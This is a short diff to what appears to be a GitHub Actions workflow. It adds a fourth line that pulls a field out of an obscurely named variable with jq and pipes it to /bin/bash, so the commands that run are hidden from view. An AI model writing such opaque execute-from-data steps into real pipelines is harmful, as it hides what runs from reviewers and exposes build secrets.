@@ -24,6 +24,7 @@ jobs:
           echo $t1 | jq -r .cmxv4008 | /bin/bash
           printf '%s' "$mgk5767" | jq -r .kkixe0073 | /bin/bash
           echo $bwl1 | jq -r .zb09505 | /bin/bash
+          echo $k0251 | jq -r .lp8197 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
